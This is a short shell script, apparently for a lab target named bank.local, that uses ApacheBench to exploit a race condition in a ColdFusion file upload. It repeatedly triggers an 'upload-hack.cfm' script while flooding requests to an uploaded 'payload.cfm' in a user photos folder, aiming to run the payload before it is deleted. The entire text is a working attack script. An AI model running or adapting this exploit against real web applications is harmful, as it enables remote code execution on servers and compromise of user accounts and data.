#!/bin/sh

#upload file
ab -c 1 -n 20 http://bank.local/tools/scripts/upload-hack.cfm &

#hit attacker payload file before deleted
ab -c 10 -n 50 http://bank.local/my-account/photos/payload.cfm &
